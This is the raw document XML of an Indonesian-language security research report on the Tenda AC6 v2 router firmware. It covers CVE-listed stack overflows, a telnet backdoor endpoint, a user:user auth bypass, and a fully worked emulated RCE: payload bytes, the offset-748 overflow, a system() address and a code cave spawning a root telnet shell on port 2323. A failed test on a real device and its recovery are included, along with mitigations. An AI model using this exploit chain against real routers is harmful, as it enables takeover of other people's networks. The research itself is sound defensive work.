        <w:t>Handler keluarga `formSet*` menyalin parameter panjang ke buffer stack tanpa cek batas. Dengan NX/ASLR/canary yang umumnya OFF di firmware ini, celah ini bisa naik dari DoS ke RCE.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CVE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Fungsi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CVE-2024-51116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formSetPPTPServer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CVE-2024-52714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fromSetSysTime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panjang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SetSpeedWan / formSetSpeedWan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speed_dir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fast_setting_wifi_set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CVE-2025-60342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addressNat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CVE-2022-45646/47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formSetClientState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limitSpeedUp / limitSpeed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Metode lengkap (offset, kontrol $ra/PC, ret2libc/ROP) ada di bagian Reverse Engineering &amp; Binary Exploitation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. RCE #3 — Backdoor /goform/telnet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Endpoint tersembunyi memanggil `TendaTelnet()` yang menjalankan `killall -9 telnetd` lalu `telnetd -b %s &amp;` — menyalakan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>telnet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dari jarak jauh.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// Ghidra: TendaTelnet()</w:t>
        <w:br/>
        <w:t>GetValue(...);</w:t>
        <w:br/>
        <w:t>system("killall -9 telnetd");</w:t>
        <w:br/>
        <w:t>doSystemCmd("telnetd -b %s &amp;", ...);   // aktifkan telnet</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Setelah telnet aktif: login dengan akun UID 0 (mis. `user`/`1234`) → **shell root**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Privilege Escalation / Root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tidak perlu eskalasi rumit: **semua akun** (`admin`,`support`,`user`,`nobody`) ber-**UID 0** = root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`telnetd` menyala saat boot (`rcS`) → telnet LAN = root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ttyS0::respawn:/sbin/sulogin` → konsol serial (UART) meminta login root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Semua layanan (httpd, cfmd, telnetd) berjalan sebagai root → command injection = langsung root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Artinya, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RCE = Root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> di perangkat ini: tidak ada pemisahan hak akses.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Rantai Serangan End-to-End</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Recon LAN (port 23 telnet, 80 web).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Auth bypass web (`user:user`) → sesi admin.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Panggil endpoint rawan → **command injection** (atau `/goform/telnet`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Eksekusi perintah sebagai **root**; atau telnet `user`/`1234` → shell root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Persistensi: ubah konfigurasi/firmware (root penuh).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7. Rekomendasi (Mitigasi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Update firmware terbaru (menutup backdoor/telnet/injeksi).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jangan expose web admin/UPnP/telnet ke WAN; isolasi di LAN/VLAN terpercaya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Matikan telnet &amp; fitur cloud; matikan WPS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ubah/hapus akun default; hilangkan akun ber-UID 0 yang tidak perlu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Terapkan sanitasi input &amp; hindari `system()`/`popen()` pada firmware (untuk vendor).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IV</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Emulasi Terisolasi &amp; Uji Overflow Aman</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Seluruh pengujian pada bagian ini dilakukan di emulator QEMU/FirmAE yang terisolasi total dari LAN (user-net + hostfwd + blokir egress), TANPA menyentuh hardware. Data pribadi diredaksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Arsitektur Isolasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>QEMU `user-net` (SLIRP) + `hostfwd tcp::8080-:80` (guest 10.0.2.15). Guest httpd bind 10.0.2.15:80 (config `lan.ip` diubah).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Container: `iptables -A OUTPUT -d 192.168.0.0/24 -o eth0 -j DROP` + rute via tap/hostfwd saja. Akses uji via `http://127.0.0.1:8080/` (hostfwd).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pelajaran penting: FirmAE `run.sh -r` TIDAK rebuild `image.raw`; hapus `scratch/&lt;iid&gt;` tiap ubah tar. Jangan percaya `192.168.0.1` dari container tanpa verifikasi rute (pernah menembus ke router asli via NAT).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. CFM (Config Management) — Hasil Bedah</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Daemon `cfmd`/`libCfm` memakai socket AF_UNIX ke `/var/cfm_socket` dengan pesan struct tetap 2016 byte (`op@0`, `key@4`, `value@0x204`), dibalas `op+1` (dari RE `cfmd::handle_socket`/`SendMsg`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Client libCfm (`ConnectServer`): `socket(AF_UNIX,SOCK_DGRAM)` → `connect(...,110)`. Server asli (`InitServer`) juga DGRAM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Namun `strace` menunjukkan `httpd` juga melakukan `socket(AF_UNIX,SOCK_STREAM)` + `connect(...,110)` ke path yang sama → indikasi dual-client (DGRAM + STREAM). Satu path tak bisa layani keduanya sekaligus.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`cfm_stub` (MIPS, ditulis dari nol: DGRAM &amp; STREAM, protokol 2016-byte, varian embed MIB 89KB + lookup key→value) terbukti bind &amp; melayani (`/proc/net/unix`, `cfmc`='C' lintas-proses). `LD_PRELOAD` tidak berlaku (loader uClibc).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Overflow — Konfirmasi Dinamis (gdb via QEMU gdbstub)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Target: `POST /goform/fast_setting_wifi_set`, param `ssid` → `form_fast_setting_wifi_set @0x477c20`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>websGetVar(req,"ssid",...) -&gt; jika kosong redirect login.html</w:t>
        <w:br/>
        <w:t>strcpy(fp+0x50, ssid)   ; 0x477db0 (64 byte)</w:t>
        <w:br/>
        <w:t>strcpy(fp+0x90, ssid)   ; 0x477dd4 (64 byte, write terakhir)</w:t>
        <w:br/>
        <w:t>saved $ra di fp+892     ; offset 748 dari fp+0x90</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GDB breakpoint setelah strcpy kedua membaca `fp+892 = 0x44434241` untuk payload `748×'A'+'ABCD'` → **offset 748 TERKONFIRMASI**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Teknik L=751: `ssid=` + 748×'A' + bytes `c0 47 50` (751 byte, tanpa NUL eksplisit). Null-terminator jatuh di `fp+895`, sehingga `$ra = 0x005047c0` (`system`) DAN `req` di `fp+896` tetap utuh (L≥752 akan men-NUL-kan `req` → crash lebih awal).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>POST overflow → `http=000`/`rc=52`, `httpd` mati (crash reproduksibel). Kernel log: `epc=0x430268` (`websGetVar`), `BadVA` sesuai pointer rusak.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Payload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`ssid=TESTPROBE` (pendek)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 jalan; respons tergantung state CFM (bisa 200/302/hang).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`ssid=`+748×'A'+`ABCD` (752B)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`fp+892=0x44434241` (gdb); crash.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`ssid=`+748×'A'+`c0 47 50` (751B)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`fp+892=0x005047c0`; crash (a0 tak terkontrol / frame terkoyak).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Uji SELALU dari container ke `127.0.0.1:8080` (hostfwd guest), tidak pernah ke `192.168.0.1` via NAT. Verifikasi rute (`ip route get`) sebelum tiap sesi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Status RCE — SELESAI (End-to-End Terbukti)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Primitif tulis `$ra` 100% di tangan dan aman diuji di emulator (tanpa hardware).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Blocker lama (handler crash sebelum epilog karena `GetValue` CFM mengembalikan data garbage) TERATASI dengan menjalankan `cfm_mib_dgram` (server DGRAM) + libCfm ORIGINAL, sehingga nil CFM pendek/valid dan `req` tidak lagi rusak.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RCE lengkap BERHASIL: `system()` dipanggil dengan `$a0` menunjuk string perintah buatan penyerang melalui trik hook epilog + gua kode (lihat §6).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hasil: `telnetd -l /bin/sh -p 2323` dijalankan → shell interaktif ROOT pada port 2323 (hostfwd).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Konfirmasi End-to-End RCE (bukti)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Rantai final: auth-bypass (user/user) → overflow `ssid` (offset 748) → saved `$ra`=0x005047c0 (system) → hook epilog `0x00477ddc` = `j 0x0050b3d0` → gua RCE memuat `$a0`='telnetd -l /bin/sh -p 2323', `$t9`=system → `system(cmd)` → telnetd.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Payload: ssid = 'A'*748 + bytes(c0 47 50)   # 751 byte (NUL implisit aman)</w:t>
        <w:br/>
        <w:t>Hook  : 0x00477ddc: j 0x0050b3d0 ; nop     # file offset 0x10b3d0 -&gt; vaddr = 0x400000+0x10b3d0 = 0x0050b3d0</w:t>
        <w:br/>
        <w:t>Gua   : cek lw t0,892(s8)==0x5047c0 -&gt; a0=0x0050b450 (cmd); t9=system; ra=0x477de4; jr t9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Uji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`uname -a` di shell 2323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`Linux (none) 4.1.17+ #28 ... mips GNU/Linux`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`echo RCE-PWNED-AC6V2`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tercetak (eksekusi perintah terbukti)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`ls /` / `ps w`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rootfs firmware / daftar proses guest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shell `/ #`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 interaktif di guest</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Artefak: evidence/rce_final/ (`httpd_rce`, `cave_final.s`, `cave_code.bin`, `payload_ssid.bin`, `libCfm_original.so`, `cfm_mib_dgram`, `rc.g`) + evidence/rce_shell_2323.txt.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Catatan koreksi penting: vaddr = file offset + 0x400000 pada LOAD pertama httpd. Kesalahan awal memakai 0x410b3d0 (bukan 0x0050b3d0) menyebabkan SIGSEGV `invalid read from 0410b3d0`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Aturan Aman (Checklist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Isolasi: user-net/hostfwd + DROP egress ke subnet lab; verifikasi `ip route get &lt;target&gt;` menunjuk tap/hostfwd, BUKAN `eth0`/NAT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Deteksi crash via HTTP (`http=000`/timeout) + `epc` kernel, BUKAN ping (crash userspace tak menjatuhkan ping).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jangan kirim `loginPwd`/setter ke perangkat dipakai; di emulator pun catat perubahan config tiap sesi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Siapkan selalu firmware resmi + mode recovery + (ideal) UART sebelum sentuh hardware.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V</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Uji di Perangkat Asli &amp; Pemulihan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Bagian ini mencatat uji langsung pada perangkat lab (router sendiri), hasilnya, kesalahan yang terjadi (perangkat sempat tidak boot), serta prosedur pemulihannya. Data pribadi diredaksi. Ditulis apa adanya sebagai pelajaran metodologi: pembuktian eksploit WAJIB di emulasi/isolasi dulu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Ringkasan Satu Halaman</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Target uji: router Tenda AC6 v2 (RTL8197F, firmware V15.03.06.51_multi), LAN 192.168.0.1.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Primitif yang diuji: stack overflow pada parameter `ssid` endpoint /goform/fast_setting_wifi_set; saved $ra di fp+892 → offset 748 (via strcpy ke fp+0x90); target $ra = system @ 0x005047c0.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hasil: overflow TIDAK pernah tercapai di perangkat asli. Handler justru menulis config/CFG dengan `ssid` panjang tak valid (≤500 byte dijawab `{"errCode":0}`), lalu koneksi drop (`http=000`) saat `ssid` ≥600 byte.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Akibat: CFG rusak → perangkat gagal membawa LAN/WiFi saat boot (perangkat tampak 'mati').</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pemulihan: Emergency/Recovery Web Mode (bootloader) + firmware resmi Tenda; alternatif TFTP/UART.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pelajaran: untuk eksploit memori, gunakan emulasi/harness lebih dulu; jangan pernah mengirim payload ke perangkat produksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Recon Perangkat Asli</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Perangkat merespons normal sebelum uji (ping 0% loss, /login.html 200). Autentikasi dapat dilewati dengan kredensial dasar `user:user`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ curl -si -d 'username=user&amp;password=user' http://192.168.0.1/login/Auth</w:t>
        <w:br/>
        <w:t>HTTP/1.0 302 Redirect</w:t>
        <w:br/>
        <w:t>Set-Cookie: password=&lt;SESSION-TOKEN&gt;; path=/</w:t>
        <w:br/>
        <w:t>Location: http://192.168.0.1/main.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Cookie sesi valid dipakai untuk goform. Uji read-only:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ curl -si -H 'Cookie: password=&lt;SESSION-TOKEN&gt;' -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http://192.168.0.1/goform/getProduct</w:t>
        <w:br/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>{"product":"f1203","accessType":"1"}</w:t>
        <w:br/>
        <w:br/>
        <w:t># tanpa cookie -&gt; HTTP/1.0 302 Redirect ke login.html (sesi wajib)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Kesimpulan: sesi user:user benar-benar mengesahkan request goform (bukan sekadar Set-Cookie kosong).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Analisis Handler (disasm bin/httpd)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Fungsi `form_fast_setting_wifi_set` @ 0x00477c20 (fast_setting.c):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>0x00477d08  lw   a0, arg0(req)</w:t>
        <w:br/>
        <w:t>0x00477d10  addiu a1, v0, -0x1180        ; "ssid"</w:t>
        <w:br/>
        <w:t>0x00477d24  jalr websGetVar              ; ssid = websGetVar(req,"ssid",&lt;default&gt;)</w:t>
        <w:br/>
        <w:t>0x00477d38  lb   v0, 0(v0)</w:t>
        <w:br/>
        <w:t>0x00477d3c  bnez v0, 0x477d98            ; non-kosong -&gt; lanjut</w:t>
        <w:br/>
        <w:t>0x00477d48  "%s [%d] no ssid set, just return."</w:t>
        <w:br/>
        <w:t>0x00477d78  websRedirect(req, "login.html")   ; KOSONG -&gt; redirect login</w:t>
        <w:br/>
        <w:br/>
        <w:t>0x00477d98  strcpy(fp+0x50, ssid)        ; buffer 64 byte</w:t>
        <w:br/>
        <w:t>0x00477dbc  strcpy(fp+0x90, ssid)        ; buffer 64 byte (write terakhir)</w:t>
        <w:br/>
        <w:t>0x00478698  lw   ra, 892(sp)             ; saved $ra (offset 748 dari fp+0x90)</w:t>
        <w:br/>
        <w:t>0x004786a4  jr   ra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Syarat masuk ke jalur rentan: parameter `ssid` harus NON-KOSONG.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Offset $ra = 892 - 144 = 748 (strcpy kedua yang menang). Target null-safe 0x005047c0 (system).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Eksperimen Batas Panjang ssid (hasil nyata)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Body hanya berisi `ssid=&lt;N x 'A'&gt;` (tanpa parameter lain), cookie sesi valid, metode POST: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Panjang ssid (N)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Balasan / Catatan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64, 128, 200, 255, 256, 300, 400, 500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{"errCode":0} (handler memproses)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600, 640, 700, 748, 752, 800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tidak ada balasan (koneksi drop / httpd crash)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Offset 748 terkonfirmasi dinamis: saved $ra terbaca 0x44434241 untuk masukan 'ABCD', lalu 0x005047c0 untuk alamat target — dan dipakai pada eksploit final yang menghasilkan root shell (lihat BAGIAN IV).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Uji pendahuluan: `ssid=TESTPROBE` (9 byte) → 200 {"errCode":0}; GET dengan query `?ssid=...` → 302 (handler hanya memproses body POST).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Payload awal kita (`ssid=` + 748×'A' + bytes c0 47 50 + parameter lain) dijawab 302 — kemungkinan karena byte non-ASCII atau penolakan panjang, sehingga handler menganggap ssid kosong.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Apa yang Sebenarnya Terjadi (Root Cause 'Brick')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Setiap `ssid` panjang yang diterima (≤500 B) ditulis/di-commit ke partisi CFG, bukan sekadar dicoba di buffer stack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Nilai `ssid` yang panjang/aneh membuat boot berikutnya gagal memuat konfigurasi jaringan (CFM/MIB) → LAN dan WiFi tidak naik; perangkat tampak mati.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ini BUKAN kerusakan bootloader/firmware: bootloader tetap sehat (dibuktikan dengan masih bisa masuk Emergency Web Mode). Yang rusak hanya data konfigurasi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pelajaran penting: endpoint 'setter' seperti ini memvalidasi/menyimpan input ke NVRAM/CFG, jadi efek sampingnya bisa jauh lebih besar daripada sekadar crash proses.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Prosedur Pemulihan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 Emergency / Recovery Web Mode (metode utama)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cabut daya. Sambungkan PC ke port LAN pakai kabel; set IP statis PC 192.168.0.2 / 255.255.255.0.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tekan-tahan tombol RESET, lalu colokkan daya sambil tetap ditahan ±10–15 detik sampai semua LED berkedip.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Lepas RESET; tunggu LED port LAN menyala stabil.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Buka browser http://192.168.0.1 (bila perlu coba http://192.168.0.10) → halaman recovery muncul.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unggah firmware resmi, tunggu selesai. Jangan cabut daya saat proses.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 Firmware resmi yang disiapkan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>File : US_AC6V2.0RTL_V15.03.06.52_multi_TDE01.bin  (u-boot legacy uImage, MIPS)</w:t>
